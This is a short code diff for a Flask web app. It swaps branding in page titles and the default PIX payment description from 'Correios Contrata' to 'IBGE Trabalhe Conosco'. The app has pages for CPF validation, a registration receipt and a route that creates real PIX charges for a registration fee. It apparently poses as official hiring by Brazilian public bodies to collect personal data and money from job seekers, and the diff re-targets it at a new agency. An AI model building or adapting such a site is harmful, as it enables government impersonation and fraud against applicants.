@@ -469,12 +469,12 @@ def validar_cpf():
 @app.route('/comprovante-inscricao')
 def comprovante_inscricao():
     """Proof of registration page"""
-    return render_template('comprovante_inscricao.html', page_title="Comprovante de Inscrição - Correios Contrata")
+    return render_template('comprovante_inscricao.html', page_title="Comprovante de Inscrição - IBGE Trabalhe Conosco")
 
 @app.route('/pagamento-pix')
 def pagamento_pix():
     """PIX payment page"""
-    return render_template('pagamento_pix.html', page_title="Pagamento PIX - Correios Contrata")
+    return render_template('pagamento_pix.html', page_title="Pagamento PIX - IBGE Trabalhe Conosco")
 
 @app.route('/api/gerar-pix', methods=['POST'])
 def gerar_pix():
@@ -517,7 +517,7 @@ def gerar_pix():
         
         # Criar transação PIX REAL
         valor_centavos = int(valor * 100)  # Converter para centavos
-        descricao = dados.get('descricao', 'Taxa de Inscrição - Correios Contrata')
+        descricao = dados.get('descricao', 'Taxa de Inscrição - IBGE Trabalhe Conosco')
         
         transaction = api.create_pix_transaction(customer, valor_centavos, descricao)
         
